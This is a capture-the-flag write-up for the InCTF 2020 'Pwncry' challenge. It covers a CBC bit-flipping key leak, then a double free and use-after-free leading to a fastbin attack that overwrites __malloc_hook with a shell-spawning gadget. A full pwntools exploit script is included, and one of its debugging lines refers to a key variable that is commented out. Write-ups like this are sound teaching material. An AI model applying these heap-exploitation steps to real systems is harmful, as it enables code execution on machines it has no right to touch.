---
title: Pwncry - InCTF Internationals 2020
date: 2020-08-09 19:30:00
author: rudyerudite
author_url: https://twitter.com/rudyerudite
categories:
  - Pwn 
  - Linux
  - ELF
tags:
  - InCTFi
---

**tl;dr**
+ Passing corrupted ciphertext to get the symmetric key leak
+ Fastbin link corruption
+ Exploiting double free and UAF in the heap

<!--more-->
**Challenge points**: 964
**No. of solves**: 10
**Challenge author**: [rudyerudite](https://twitter.com/rudyerudite)

## Challenge description

The description for this challenge says, 
***Sail through Hade's abode with your double-edged sword!***

Further, the challenge was developed and tested on an environment with `libc-2.23.so` and `OpenSSL1.0.2g` for encryption functionality. In the following writeup, we will reference the functions used for encryption as `Enc(plaintext)` and decryption function as `Dec(ciphertext)`.

## Understanding functionality

Before getting our hands dirty, executing `checksec` tells us about the mitigations enabled in the binary:
```bash
Canary                        : Yes
NX                            : Yes
PIE                           : Yes
Fortify                       : No
RelRO                         : Full
```

The challenge performs the function of encrypting the user's input and storing the ciphertext in user-allocated heap chunks (option 1) and deletes them on the user's request (option 3). A user can allocate a maximum of 9 chunks.

```bash
IV:aed9e7cf03014684820330cd5099a511
Behold young mortal! Welcome to Hade\'s land
Enter 3 letter-code :aaa
Encrypted code : 208d1f2a5bcf8e4242a4cd5d48e02d3d

Enter your vault ID:1
Behold young mortal! Welcome to Hade\'s land
1. Conceal ya spell
2. Change code
3. Recover ya magic
4. Quit ya quest
```

The player can store a plaintext on the .bss section and modify it later by sending the ciphertext (option 2). The key and the IV used for `AES-CBC encryption` are stored in the .bss section. The IV is generated randomly and a static key used (read from a file) in every session. 

## Exploitation

Deletion of a chunk causes a `double-free` and also there exists a `UAF` which can help us to get the `libc leaks` easily by freeing, allocating, and reading the same Unsorted Bin chunk.
To overwrite the pointer the attacker must get the `symmetric key` used in the block cipher otherwise the encryption functionality would corrupt the user's payload when storing it in memory. For getting a way out of this we need `symmetric key` leaks.

Now we will use option 3 here. As the binary prints the name we can leak the key too! For that we need to bypass the `remove_padding` function. Why? Check out the snippet:

```bash
if(end<=16) 
  { printf("padding len %d\n", end); 
    for(int i=0; i<end;i++) 
        *(data + (i+data_len)) = "\x00"; 
    return; 
  }
```

To avoid the replacement with NULL bytes, the attacker must craft a ciphertext payload such that the last byte of the decrypted ciphertext is a negative number. In doing so, the naive padding function does not operate correctly (retaining the padded bytes). The intended way for this was to use the [CBC bit-flipping attack](https://masterpessimistaa.wordpress.com/2017/05/03/cbc-bit-flipping-attack/) to modify the last byte of the initial ciphertext (Encrypted code). This leads to leaking out the `symmetric key` as there is no null-byte termination for the naive `printf()`. 

After leaking our the key, the attacker must send the Dec(payload) and use the given IV and leaked key for the operation. As, `Enc(Dec(PT)) == Dec(Enc(PT))` we can now craftily pass our input such that the intended payload is not corrupted by the encryption function.

After this, the player can use the double free and overwrite the forward pointer of the fastbin chunk with a pointer near `__malloc_hook` such that the next pointer points to value `0x7F` (satisfying the size check of fastbin). A detailed explanation for the fastbin corruption attack can be found [here](https://vigneshsrao.github.io/memoheap/). Mind you, the fake address or the attack payload must be sent to the binary as `Dec(Fake_addr_payload)`. The content is then stored as `Enc(Dec(Fake_addr_payload))` which is `Fake_addr_payload` in the heap chunk. 

We can get a chunk allocated at this address after invoking a couple of `malloc()` functions. We can then overwrite `__malloc_hook` with a gadget that executes `system()` on the next allocation.

## Exploit code

```python
from pwn import *
from Crypto.Cipher import AES
r = process("./chall",env = {"LD_PRELOAD" : "./libc-2.23.so"})
#r = remote('35.245.143.0',1337)
#key = "5949eebb28e0df11feac0b73bdb4dba2".decode("hex") <-- hardcoding actual key on the server

def decrypt(payload,IV,key):
    obj = AES.new(key, AES.MODE_CBC,IV)
    ques = obj.decrypt(payload)                        #encrypt the string and send it 
    return ques.encode("hex")

def vault_ID(id):
    r.sendlineafter("Enter your vault ID:",str(id))

def conceal_spell(pt,size):
    r.sendlineafter("quest\n",str(1))
    r.sendlineafter("size:\n",str(size))
    r.sendlineafter("plaintext:",pt)
    r.recvuntil("concealed!\n")
    ct = r.recvline().strip().decode("hex")
    print("Ciphertext: {}".format(ct.encode("hex")))
    return ct

def delete():
    r.sendlineafter("quest\n",str(3))

def change_name(ct,fake_iv):
    r.sendlineafter("quest\n",str(2))
    r.sendlineafter("Enter encrypted name:",ct)
    r.sendlineafter("Enter IV(16 bytes):",fake_iv)

def exit_(payload):
    r.sendlineafter("quest\n",str(4))
    r.sendline(payload)

#getting key leaks
r.recvuntil("IV:")
IV =  r.recvline().strip().decode("hex")
r.sendlineafter('letter-code :','aaa')
r.recvuntil("code : ")
ct = r.recvline().strip().decode("hex")
vault_ID(1)
fake_iv = ""
ct_p = ct[15]
ct_p = chr(ord(IV[15])^ord('\xff')^ord('\x0d'))
fake_iv = IV[:15]+ct_p

change_name(ct.encode("hex"),fake_iv)
print(r.recvuntil("new name:"))
r.recv(16)
key_leak = r.recv(16)
r.recv(16)

log.success("Key leaked = " + str(key_leak))
log.info("key orig = " + key.encode("hex"))
print(key_leak == key)
print(key.encode("hex"))

# unsorted bin leaks
vault_ID(1)
ct = conceal_spell('a'*0x8,0x70)
vault_ID(2)
ct = conceal_spell('a'*0x8,0x50)
vault_ID(1)
delete()
vault_ID(3)
libc_ptr = u64(conceal_spell('\x00',0x70).ljust(8,'\x00'))-0x3f80-0xbf8
#io_wide = libc_ptr+0x4aed
libc_base = libc_ptr-0x3c0000
log.info("libc_base {}".format(hex(libc_base)))
one_gadget = libc_base+ 0xf02a4

#exploiting double free
vault_ID(4)
ct = conceal_spell('b'*0x8,0x50)
vault_ID(2)
delete()
vault_ID(4)
delete()
vault_ID(2) #2->4->2
delete()
vault_ID(5)

#overwriting forward pointer of fastbin 
target = libc_base + 0x3c4aed
payload = p64(target)+'\x08'*8
k = decrypt(payload,IV,key_leak)
conceal_spell(k.decode("hex"),0x50)
vault_ID(6)
conceal_spell("c"*0xf,0x50)
vault_ID(7)
conceal_spell("c"*0x8,0x50)
vault_ID(8)

#overwriting __malloc_hook with one_gadget
payload = 'a'*19 + p64(one_gadget)+'\x05'*5
print(len(payload))
k = decrypt(payload,IV,key_leak)
print("sending...{}".format(k.encode("hex")))
conceal_spell(k.decode("hex"),0x50)

#triggering system()
vault_ID(9)
r.sendline(str(1))
r.sendline(str(0x20))
r.sendlineafter("plaintext:",'\x00')

r.interactive()
```

